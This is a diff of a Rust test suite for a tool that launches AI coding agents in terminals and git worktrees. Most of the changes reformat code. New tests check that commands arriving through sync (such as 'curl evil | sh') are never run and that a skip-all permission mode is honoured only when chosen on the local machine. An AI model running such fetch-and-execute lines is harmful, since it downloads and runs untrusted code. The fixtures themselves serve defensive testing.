         let repo_dir = tmp.path().join("repo");
         std::fs::create_dir_all(&repo_dir).unwrap();
         init_repo(&repo_dir);
-        let mut repo = Repository::new("test".into(), Some(repo_dir.to_string_lossy().into_owned()), None);
+        let mut repo = Repository::new(
+            "test".into(),
+            Some(repo_dir.to_string_lossy().into_owned()),
+            None,
+        );
         repo.default_branch = "main".into();
         repositories.insert(&repo).await.unwrap();
         let worktree_path = tmp.path().join("discarded");
@@ -2405,8 +2815,7 @@ mod tests {
 
         let mut workspace = Workspace::new(repo.id.clone(), "no branch".into(), "echo".into());
         workspace.branch = None;
-        workspace.worktree_path =
-            Some(tmp.path().join("gone").to_string_lossy().into_owned());
+        workspace.worktree_path = Some(tmp.path().join("gone").to_string_lossy().into_owned());
 
         let err = orchestrator.cwd_for_task(&workspace).await.unwrap_err();
         assert!(matches!(err, OrchestratorError::WorktreeUnavailable));
@@ -2498,7 +2907,10 @@ mod tests {
         request.permission_mode = Some(PermissionMode::AskEdits);
         request.notify_on_attention = false;
         let started = orchestrator.start_task(request).await.unwrap();
-        assert_eq!(started.workspace.permission_mode, Some(PermissionMode::AskEdits));
+        assert_eq!(
+            started.workspace.permission_mode,
+            Some(PermissionMode::AskEdits)
+        );
         assert!(!started.workspace.notify_on_attention);
 
         // Persisted, not just echoed.
@@ -2516,7 +2928,10 @@ mod tests {
         local.workspace_kind = WorkspaceKind::Local;
         local.status = WorkspaceStatus::Stopped;
         local.worktree_path = repo.local_path.clone();
-        WorkspaceRepo::new(pool.clone()).insert(&local).await.unwrap();
+        WorkspaceRepo::new(pool.clone())
+            .insert(&local)
+            .await
+            .unwrap();
         local
     }
 
@@ -2535,7 +2950,10 @@ mod tests {
         let repo_path = Path::new(repo.local_path.as_deref().unwrap()).to_path_buf();
         let local = local_workspace(&pool, &repo).await;
 
-        let started = orchestrator.start_task(in_place_request(&repo.id)).await.unwrap();
+        let started = orchestrator
+            .start_task(in_place_request(&repo.id))
+            .await
+            .unwrap();
         assert_eq!(started.task_id, local.id, "reuses the local row");
         let row = &started.workspace;
         assert_eq!(row.workspace_kind, WorkspaceKind::Local);
@@ -2566,11 +2984,17 @@ mod tests {
         let repo = repo_with_git(&repositories, &tmp, "repo").await;
         let local = local_workspace(&pool, &repo).await;
 
-        orchestrator.start_task(in_place_request(&repo.id)).await.unwrap();
+        orchestrator
+            .start_task(in_place_request(&repo.id))
+            .await
+            .unwrap();
         let mut second = in_place_request(&repo.id);
         second.agent = Agent::Codex;
         let err = orchestrator.start_task(second).await.unwrap_err();
-        assert!(matches!(err, OrchestratorError::InPlaceTaskRunning), "{err:?}");
+        assert!(
+            matches!(err, OrchestratorError::InPlaceTaskRunning),
+            "{err:?}"
+        );
         assert_eq!(
             err.to_string(),
             "an in-place task is already running in this repository"
@@ -2606,9 +3030,15 @@ mod tests {
         let shell_handle = orchestrator.runtime.get(&local.id).unwrap();
         let mut status_rx = orchestrator.subscribe_status();
 
-        let started = orchestrator.start_task(in_place_request(&repo.id)).await.unwrap();
+        let started = orchestrator
+            .start_task(in_place_request(&repo.id))
+            .await
+            .unwrap();
         let agent_handle = orchestrator.runtime.get(&local.id).unwrap();
-        assert!(!Arc::ptr_eq(&shell_handle, &agent_handle), "shell was replaced");
+        assert!(
+            !Arc::ptr_eq(&shell_handle, &agent_handle),
+            "shell was replaced"
+        );
         assert_eq!(started.workspace.agent, Some(Agent::Claude));
 
         // Only the agent's `running` may be broadcast; give the old shell's
@@ -2623,7 +3053,10 @@ mod tests {
         }
         let row = orchestrator.workspaces.get(&local.id).await.unwrap();
         assert_eq!(row.status, WorkspaceStatus::Running);
-        let still = orchestrator.runtime.get(&local.id).expect("agent PTY still registered");
+        let still = orchestrator
+            .runtime
+            .get(&local.id)
+            .expect("agent PTY still registered");
         assert!(Arc::ptr_eq(&still, &agent_handle));
 
         orchestrator.quiesce_task(&local.id).await;
@@ -2641,7 +3074,10 @@ mod tests {
             .execute(&pool)
             .await
             .unwrap();
-        let started = orchestrator.start_task(in_place_request(&repo.id)).await.unwrap();
+        let started = orchestrator
+            .start_task(in_place_request(&repo.id))
+            .await
+            .unwrap();
         assert_eq!(started.task_id, local.id);
         assert_eq!(started.workspace.status, WorkspaceStatus::Running);
         assert_eq!(started.workspace.exit_code, None);
@@ -2649,7 +3085,10 @@ mod tests {
 
         // A repository with no local row yet gets one.
         let other = repo_with_git(&repositories, &tmp, "other").await;
-        let started = orchestrator.start_task(in_place_request(&other.id)).await.unwrap();
+        let started = orchestrator
+            .start_task(in_place_request(&other.id))
+            .await
+            .unwrap();
         assert_eq!(started.workspace.workspace_kind, WorkspaceKind::Local);
         assert_eq!(started.workspace.name, "local");
         assert_eq!(started.workspace.worktree_path, other.local_path);
@@ -2667,7 +3106,10 @@ mod tests {
         let mut request = sleep_request(&repo.id, "evil");
         request.base_branch = Some(evil.into());
         let err = orchestrator.start_task(request).await.unwrap_err();
-        assert!(matches!(err, OrchestratorError::InvalidBaseBranch(_)), "{err}");
+        assert!(
+            matches!(err, OrchestratorError::InvalidBaseBranch(_)),
+            "{err}"
+        );
 
         let row = TaskRow {
             repository_id: repo.id.clone(),
@@ -2686,7 +3128,10 @@ mod tests {
             Err(OrchestratorError::InvalidBaseBranch(_))
         ));
         // Arrived via sync (no input validation on that path): launch refuses.
-        let mut synced = TaskRow { base_branch: None, ..row };
+        let mut synced = TaskRow {
+            base_branch: None,
+            ..row
+        };
         synced.name = "synced-evil".into();
         let saved = orchestrator.create_row(synced, None).await.unwrap();
         sqlx::query("UPDATE workspaces SET base_branch = ? WHERE id = ?")
@@ -2705,7 +3150,10 @@ mod tests {
     async fn send_message_reaches_the_task_and_requires_a_live_pty() {
         let (orchestrator, repositories, _pool, tmp) = fresh_orchestrator().await;
         let repo = repo_with_git(&repositories, &tmp, "repo").await;
-        let err = orchestrator.send_message("missing", "hi", true).await.unwrap_err();
+        let err = orchestrator
+            .send_message("missing", "hi", true)
+            .await
+            .unwrap_err();
         assert!(matches!(err, OrchestratorError::TaskNotRunning(_)));
 
         let mut request = sleep_request(&repo.id, "echo-back");
@@ -2714,7 +3162,8 @@ mod tests {
         // proving the text was delivered AND submitted. Run as its own
         // process (like a real agent): with the shell itself in the
         // foreground, `send_message` refuses ("agent not running").
-        request.command = r#"sh -c 'printf "rea%s\n" dy; IFS= read -r line; echo "got[$line]"'"#.into();
+        request.command =
+            r#"sh -c 'printf "rea%s\n" dy; IFS= read -r line; echo "got[$line]"'"#.into();
         let started = orchestrator.start_task(request).await.unwrap();
         let handle = orchestrator.runtime.get(&started.task_id).unwrap();
         let (replay, mut rx) = handle.subscribe_with_replay();
@@ -2726,7 +3175,10 @@ mod tests {
         }
         let deadline = tokio::time::Instant::now() + Duration::from_secs(15);
         while !output.contains("ready") {
-            assert!(tokio::time::Instant::now() < deadline, "never ready; output: {output:?}");
+            assert!(
+                tokio::time::Instant::now() < deadline,
+                "never ready; output: {output:?}"
+            );
             if let Ok(Ok(PtyEvent::Output { chunk, .. })) =
                 tokio::time::timeout(Duration::from_millis(200), rx.recv()).await
             {
@@ -2739,7 +3191,10 @@ mod tests {
             .unwrap();
 
         while !output.contains("got[hello agent]") {
-            assert!(tokio::time::Instant::now() < deadline, "no echo; output: {output:?}");
+            assert!(
+                tokio::time::Instant::now() < deadline,
+                "no echo; output: {output:?}"
+            );
             match tokio::time::timeout(Duration::from_millis(200), rx.recv()).await {
                 Ok(Ok(PtyEvent::Output { chunk, .. })) => {
                     output.push_str(&String::from_utf8_lossy(&chunk))
@@ -2833,7 +3288,10 @@ sleep 30
     async fn wait_for<F: FnMut() -> bool>(what: &str, mut done: F) {
         let deadline = std::time::Instant::now() + Duration::from_secs(20);
         while !done() {
-            assert!(std::time::Instant::now() < deadline, "timed out waiting for {what}");
+            assert!(
+                std::time::Instant::now() < deadline,
+                "timed out waiting for {what}"
+            );
             tokio::time::sleep(Duration::from_millis(50)).await;
         }
     }
@@ -2897,7 +3355,10 @@ sleep 30
         assert_eq!(err.to_string(), "stale attention");
         tokio::time::sleep(Duration::from_millis(800)).await;
         collect_output(&mut rx, &mut out);
-        assert!(!out.contains("got-answer"), "a stale respond typed something: {out}");
+        assert!(
+            !out.contains("got-answer"),
+            "a stale respond typed something: {out}"
+        );
 
         orchestrator
             .respond_to_attention(&task_id, &attention.id, AttentionResponse::AllowOnce)
@@ -2915,10 +3376,19 @@ sleep 30
         })
         .await;
         assert_eq!(
-            workspaces.get_agent_session_id(&task_id).await.unwrap().as_deref(),
+            workspaces
+                .get_agent_session_id(&task_id)
+                .await
+                .unwrap()
+                .as_deref(),
             Some("11111111-2222-4333-8444-555555555555")
         );
-        assert!(workspaces.get(&task_id).await.unwrap().last_turn_ended_at.is_some());
+        assert!(workspaces
+            .get(&task_id)
+            .await
+            .unwrap()
+            .last_turn_ended_at
+            .is_some());
 
         // Stop, wait for the PTY to go, then re-open: resume, no prompt.
         orchestrator.stop_task(&task_id).await.unwrap();
@@ -2933,8 +3403,14 @@ sleep 30
         .await;
         tokio::time::sleep(Duration::from_millis(1500)).await;
         collect_output(&mut rx, &mut resumed);
-        assert!(!resumed.contains("do the thing"), "prompt re-sent on resume: {resumed}");
-        assert!(resumed.contains("--resume 11111111-2222-4333-8444-555555555555"), "{resumed}");
+        assert!(
+            !resumed.contains("do the thing"),
+            "prompt re-sent on resume: {resumed}"
+        );
+        assert!(
+            resumed.contains("--resume 11111111-2222-4333-8444-555555555555"),
+            "{resumed}"
+        );
 
         orchestrator.quiesce_task(&task_id).await;
         assert!(signals.state(&task_id).is_none());
@@ -2990,7 +3466,12 @@ exit 1
         signals: &AgentSignals,
         repositories: &RepositoryRepo,
         tmp: &tempfile::TempDir,
-    ) -> (StartedTask, crate::agent_signals::state::Attention, broadcast::Receiver<PtyEvent>, String) {
+    ) -> (
+        StartedTask,
+        crate::agent_signals::state::Attention,
+        broadcast::Receiver<PtyEvent>,
+        String,
+    ) {
         use crate::agent_signals::state::{AgentStateKind, AttentionKind};
         let repo = repo_with_git(repositories, tmp, "repo").await;
         let fake = fake_trust_claude(tmp);
@@ -3010,7 +3491,9 @@ exit 1
         wait_for("trust card", || {
             signals.state(&task_id).is_some_and(|s| {
                 s.state == AgentStateKind::NeedsYou
-                    && s.attention.as_ref().is_some_and(|a| a.kind == AttentionKind::Trust)
+                    && s.attention
+                        .as_ref()
+                        .is_some_and(|a| a.kind == AttentionKind::Trust)
             })
         })
         .await;
@@ -3023,7 +3506,8 @@ exit 1
     /// Down+Enter, and only then is the prompt typed and submitted — once.
     #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
     async fn trust_dialog_holds_the_prompt_until_allowed_then_types_it_once() {
-        let (orchestrator, signals, repositories, _workspaces, tmp) = orchestrator_with_signals().await;
+        let (orchestrator, signals, repositories, _workspaces, tmp) =
+            orchestrator_with_signals().await;
         let (started, attention, mut rx, mut out) =
             start_at_trust_dialog(&orchestrator, &signals, &repositories, &tmp).await;
         assert_eq!(attention.title, "Trust this folder?");
@@ -3033,10 +3517,17 @@ exit 1
         // Held: well past every typing deadline, nothing reached the dialog.
         tokio::time::sleep(Duration::from_millis(2500)).await;
         collect_output(&mut rx, &mut out);
-        assert!(!out.contains("got-keys"), "something was typed into the trust dialog: {out}");
+        assert!(
+            !out.contains("got-keys"),
+            "something was typed into the trust dialog: {out}"
+        );
 
         orchestrator
-            .respond_to_attention(&started.task_id, &attention.id, AttentionResponse::AllowTask)
+            .respond_to_attention(
+                &started.task_id,
+                &attention.id,
+                AttentionResponse::AllowTask,
+            )
             .await
             .unwrap();
         wait_for("prompt submitted", || {
@@ -3044,7 +3535,10 @@ exit 1
             out.contains("got-prompt:")
         })
         .await;
-        assert!(out.contains("got-keys:[1b5b420d]"), "trust answered with the wrong keys: {out}");
+        assert!(
+            out.contains("got-keys:[1b5b420d]"),
+            "trust answered with the wrong keys: {out}"
+        );
         tokio::time::sleep(Duration::from_millis(1500)).await;
         collect_output(&mut rx, &mut out);
         assert_eq!(out.matches("got-prompt:").count(), 1, "{out}");
@@ -3058,7 +3552,8 @@ exit 1
     /// dropped — never typed into the shell the agent quit to.
     #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
     async fn trust_dialog_denied_exits_without_typing_the_prompt() {
-        let (orchestrator, signals, repositories, _workspaces, tmp) = orchestrator_with_signals().await;
+        let (orchestrator, signals, repositories, _workspaces, tmp) =
+            orchestrator_with_signals().await;
         let (started, attention, mut rx, mut out) =
             start_at_trust_dialog(&orchestrator, &signals, &repositories, &tmp).await;
         orchestrator
@@ -3074,7 +3569,10 @@ exit 1
         tokio::time::sleep(Duration::from_millis(4000)).await;
         collect_output(&mut rx, &mut out);
         assert!(!out.contains("got-prompt"), "{out}");
-        assert!(!out.contains("do the thing"), "prompt typed after a deny: {out}");
+        assert!(
+            !out.contains("do the thing"),
+            "prompt typed after a deny: {out}"
+        );
 
         orchestrator.quiesce_task(&started.task_id).await;
         cleanup(&orchestrator, &[&started]).await;
@@ -3097,5 +3595,337 @@ exit 1
     fn interpolate_for_task_handles_missing_prompt_as_empty() {
         let out = interpolate_for_task(r#"agent --p "{{prompt}}""#, None);
         assert_eq!(out, r#"agent --p ""''"""#);
+    }
+
+    // ---- review-3 launch rules ----------------------------------------
+
+    fn draft_row(repository_id: &str, name: &str) -> TaskRow {
+        TaskRow {
+            repository_id: repository_id.to_string(),
+            agent: Agent::Claude,
+            command: "sleep 30".into(),
+            name: name.to_string(),
+            prompt: None,
+            base_branch: None,
+            permission_mode: None,
+            notify_on_attention: true,
+            queued: false,
+            depends_on: None,
+        }
+    }
+
+    /// New #1: "Start now" (and opening the terminal) while the first
+    /// launch is still in its after-create hook. The row shows as Running,
+    /// not a Draft; a second start is a no-op; the terminal refuses rather
+    /// than spawning beside the hook; exactly one agent starts afterwards
+    /// and it is NOT marked exited by a second, failed spawn.
+    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+    async fn start_now_during_setup_launches_the_agent_exactly_once() {
+        use crate::agent_signals::state::AgentStateKind;
+        use crate::domain::board::{derive_lane, Lane};
+        let (orchestrator, signals, repositories, workspaces, tmp) =
+            orchestrator_with_signals().await;
+        let repo = repo_with_git(&repositories, &tmp, "repo").await;
+        let gate = tmp.path().join("GO");
+        let configs = crate::store::RepositoryConfigRepo::new(workspaces.pool().clone());
+        let mut cfg = configs.get(&repo.id).await.unwrap();
+        cfg.pre_task_hook = Some(format!(
+            "while [ ! -f '{}' ]; do sleep 0.05; done",
+            gate.display()
+        ));
+        configs.upsert(&cfg, None).await.unwrap();
+        let orchestrator = orchestrator.with_task_config(TaskConfig::new(
+            configs,
+            crate::store::SettingsRepo::new(workspaces.pool().clone()),
+            None,
+        ));
+        let draft = orchestrator
+            .create_row(draft_row(&repo.id, "slow setup"), None)
+            .await
+            .unwrap();
+
+        let first = tokio::spawn({
+            let orchestrator = orchestrator.clone();
+            let id = draft.id.clone();
+            async move { orchestrator.launch(&id, None, None, None).await }
+        });
+        // The window: branch cut, row still `pending`, hook running.
+        let deadline = std::time::Instant::now() + Duration::from_secs(20);
+        loop {
+            if workspaces.get(&draft.id).await.unwrap().branch.is_some() {
+                break;
+            }
+            assert!(
+                std::time::Instant::now() < deadline,
+                "setup never cut the branch"
+            );
+            tokio::time::sleep(Duration::from_millis(20)).await;
+        }
+        assert!(orchestrator.is_starting(&draft.id));
+        let row = workspaces.get(&draft.id).await.unwrap();
+        assert_eq!(row.status, WorkspaceStatus::Pending);
+        let phase = signals
+            .states()
+            .into_iter()
+            .find(|s| s.task_id == draft.id)
+            .map(|s| s.state.into());
+        assert_eq!(
+            derive_lane(&row, phase, None),
+            Some(Lane::Running),
+            "never a Draft with Start now"
+        );
+
+        let again = orchestrator
+            .launch(&draft.id, None, None, None)
+            .await
+            .unwrap();
+        assert_eq!(again.task_id, draft.id);
+        assert!(
+            orchestrator.runtime.get(&draft.id).is_none(),
+            "the second start spawned nothing"
+        );
+        assert!(matches!(
+            orchestrator.open_terminal(&draft.id, 24, 80).await,
+            Err(OrchestratorError::Starting)
+        ));
+        assert_eq!(
+            OrchestratorError::Starting.to_string(),
+            "this task is still being set up; its agent starts when setup finishes"
+        );
+        assert!(
+            orchestrator.runtime.get(&draft.id).is_none(),
+            "opening the terminal spawned nothing"
+        );
+
+        std::fs::write(&gate, "").unwrap();
+        let started = first.await.unwrap().unwrap();
+        assert_eq!(started.workspace.status, WorkspaceStatus::Running);
+        assert!(!orchestrator.is_starting(&draft.id));
+        assert!(orchestrator.runtime.get(&draft.id).is_some());
+        assert_eq!(
+            signals.state(&draft.id).unwrap().state,
+            AgentStateKind::Working
+        );
+        assert_eq!(
+            count_phasr_branches(Path::new(repo.local_path.as_deref().unwrap())),
+            1
+        );
+        // Attaching now is an attach, not a second agent.
+        let before = orchestrator.runtime.get(&draft.id).unwrap();
+        orchestrator.open_terminal(&draft.id, 24, 80).await.unwrap();
+        assert!(Arc::ptr_eq(
+            &before,
+            &orchestrator.runtime.get(&draft.id).unwrap()
+        ));
+        orchestrator.quiesce_task(&draft.id).await;
+        cleanup(&orchestrator, &[&started]).await;
+    }
+
+    /// Opening a terminal resumes only a task that ran before. A legacy
+    /// pre-created workspace (or a setup an app quit interrupted) is
+    /// started by `launch`; and an agent row without a worktree here never
+    /// falls back to the repository's own checkout (the rollback hole).
+    #[tokio::test]
+    async fn open_terminal_never_starts_an_unstarted_row_or_runs_in_the_checkout() {
+        let (orchestrator, repositories, _pool, tmp) = fresh_orchestrator().await;
+        let repo = repo_with_git(&repositories, &tmp, "repo").await;
+        let repo_path = PathBuf::from(repo.local_path.clone().unwrap());
+
+        let draft = orchestrator
+            .create_row(draft_row(&repo.id, "draft"), None)
+            .await
+            .unwrap();
+        assert!(matches!(
+            orchestrator.open_terminal(&draft.id, 24, 80).await,
+            Err(OrchestratorError::NotStarted)
+        ));
+
+        let mut legacy = Workspace::new(repo.id.clone(), "legacy".into(), "sleep 30".into());
+        legacy.agent = Some(Agent::Claude);
+        let wt = tmp.path().join("wt-legacy");
+        git::create_worktree(&repo_path, &wt, "phasr/legacy", "main").unwrap();
+        legacy.branch = Some("phasr/legacy".into());
+        legacy.worktree_path = Some(wt.to_string_lossy().into_owned());
+        orchestrator.workspaces.insert(&legacy).await.unwrap();
+        assert!(matches!(
+            orchestrator.open_terminal(&legacy.id, 24, 80).await,
+            Err(OrchestratorError::NotStarted)
+        ));
+        assert!(orchestrator.runtime.get(&legacy.id).is_none());
+        // "Start now" is the explicit start.
+        let started = orchestrator
+            .launch(&legacy.id, None, None, None)
+            .await
+            .unwrap();
+        assert_eq!(started.workspace.status, WorkspaceStatus::Running);
+        assert!(orchestrator.runtime.get(&legacy.id).is_some());
+
+        // Synced from elsewhere: ran there, no branch / worktree here.
+        let mut synced = Workspace::new(repo.id.clone(), "synced".into(), "echo PWNED".into());
+        synced.agent = Some(Agent::Claude);
+        synced.status = WorkspaceStatus::Stopped;
+        synced.started_at = Some(Utc::now());
+        orchestrator.workspaces.insert(&synced).await.unwrap();
+        assert!(matches!(
+            orchestrator.open_terminal(&synced.id, 24, 80).await,
+            Err(OrchestratorError::WorktreeUnavailable)
+        ));
+        assert!(orchestrator.runtime.get(&synced.id).is_none());
+
+        orchestrator.quiesce_task(&legacy.id).await;
+        cleanup(&orchestrator, &[&started]).await;
+    }
+
+    /// Stop then an immediate reopen: a fresh session, which the stopped
+    /// one's delayed terminate (after `SIGINT_GRACE`) leaves alone.
+    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+    async fn reopening_during_the_stop_grace_spawns_fresh_and_survives_it() {
+        let (orchestrator, repositories, _pool, tmp) = fresh_orchestrator().await;
+        let repo = repo_with_git(&repositories, &tmp, "repo").await;
+        let started = orchestrator
+            .start_task(sleep_request(&repo.id, "stop-reopen"))
+            .await
+            .unwrap();
+        let old = orchestrator.runtime.get(&started.task_id).unwrap();
+        orchestrator.stop_task(&started.task_id).await.unwrap();
+        assert!(
+            orchestrator.runtime.get(&started.task_id).is_none(),
+            "out of the map at once"
+        );
+        orchestrator
+            .open_terminal(&started.task_id, 24, 80)
+            .await
+            .unwrap();
+        let fresh = orchestrator.runtime.get(&started.task_id).unwrap();
+        assert!(!Arc::ptr_eq(&old, &fresh), "attached to the dying PTY");
+
+        tokio::time::sleep(SIGINT_GRACE + Duration::from_millis(1500)).await;
+        assert!(
+            fresh.exit_code().is_none(),
+            "the old stop killed the reopened session"
+        );
+        assert!(Arc::ptr_eq(
+            &fresh,
+            &orchestrator.runtime.get(&started.task_id).unwrap()
+        ));
+        let deadline = std::time::Instant::now() + Duration::from_secs(10);
+        while old.exit_code().is_none() {
+            assert!(
+                std::time::Instant::now() < deadline,
+                "the stopped session survived"
+            );
+            tokio::time::sleep(Duration::from_millis(50)).await;
+        }
+        assert_eq!(
+            orchestrator
+                .workspaces
+                .get(&started.task_id)
+                .await
+                .unwrap()
+                .status,
+            WorkspaceStatus::Running
+        );
+        orchestrator.quiesce_task(&started.task_id).await;
+        cleanup(&orchestrator, &[&started]).await;
+    }
+
+    /// New #2: while the agent waits on a dialog, a composer message (which
+    /// ends in Enter) is refused, and nothing reaches the PTY.
+    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+    async fn send_message_is_refused_while_the_agent_waits_for_an_answer() {
+        let (orchestrator, signals, repositories, _workspaces, tmp) =
+            orchestrator_with_signals().await;
+        let (started, _attention, mut rx, mut out) =
+            start_at_trust_dialog(&orchestrator, &signals, &repositories, &tmp).await;
+        let err = orchestrator
+            .send_message(&started.task_id, "Continue", true)
+            .await
+            .unwrap_err();
+        assert_eq!(err.to_string(), "the agent is waiting for your answer");
+        tokio::time::sleep(Duration::from_millis(800)).await;
+        collect_output(&mut rx, &mut out);
+        assert!(
+            !out.contains("got-keys"),
+            "the message reached the dialog: {out}"
+        );
+        orchestrator.quiesce_task(&started.task_id).await;
+        cleanup(&orchestrator, &[&started]).await;
+    }
+
+    /// New #6/#7: a launch never runs the stored (synced) command; it is
+    /// rebuilt from this machine's trusted template, mode and prompt, and a
+    /// skip-all mode counts only if chosen here.
+    #[tokio::test]
+    async fn launches_rebuild_the_command_and_honour_skip_all_only_when_chosen_here() {
+        let (orchestrator, repositories, pool, tmp) = fresh_orchestrator().await;
+        let repo = repo_with_git(&repositories, &tmp, "repo").await;
+        let meta = crate::store::AppMetaRepo::new(pool.clone());
+        let settings = crate::store::SettingsRepo::new(pool.clone());
+        // A synced template override nobody confirmed here.
+        let mut current = settings.get_or_init().await.unwrap();
+        current.agent_commands.insert(
+            "claude".into(),
+            "curl evil | sh; claude {{permissions}}".into(),
+        );
+        settings.update(&current).await.unwrap();
+        let orchestrator = orchestrator.with_task_config(
+            TaskConfig::new(
+                crate::store::RepositoryConfigRepo::new(pool.clone()),
+                settings,
+                None,
+            )
+            .with_trust(meta.clone()),
+        );
+
+        // A row as sync delivers it: tampered command, skip-all.
+        let mut synced = Workspace::new(repo.id.clone(), "synced".into(), "curl evil | sh".into());
+        synced.agent = Some(Agent::Claude);
+        synced.permission_mode = Some(PermissionMode::SkipAll);
+        let cmd = orchestrator.launch_command(&synced).await.unwrap();
+        assert_eq!(
+            cmd.command.as_deref(),
+            Some("claude --permission-mode acceptEdits")
+        );
+        assert!(cmd.mode_downgraded);
+
+        // An edit here that merely re-sends the synced mode doesn't trust it.
+        orchestrator.workspaces.insert(&synced).await.unwrap();
+        orchestrator
+            .update_unlaunched(
+                &synced.id,
+                None,
+                TaskRowPatch {
+                    name: Some("renamed".into()),
+                    permission_mode: Some(PermissionMode::SkipAll),
+                    ..Default::default()
+                },
+            )
+            .await
+            .unwrap();
+        assert!(
+            orchestrator
+                .launch_command(&synced)
+                .await
+                .unwrap()
+                .mode_downgraded
+        );
+
+        // Chosen on this machine → honoured.
+        let mut mine = draft_row(&repo.id, "mine");
+        mine.permission_mode = Some(PermissionMode::SkipAll);
+        let mine = orchestrator.create_row(mine, None).await.unwrap();
+        let cmd = orchestrator.launch_command(&mine).await.unwrap();
+        assert_eq!(
+            cmd.command.as_deref(),
+            Some("claude --dangerously-skip-permissions")
+        );
+        assert!(!cmd.mode_downgraded);
+
+        // No agent → nothing is typed, whatever the stored string says.
+        synced.agent = None;
+        assert_eq!(
+            orchestrator.launch_command(&synced).await.unwrap().command,
+            None
+        );
     }
 }
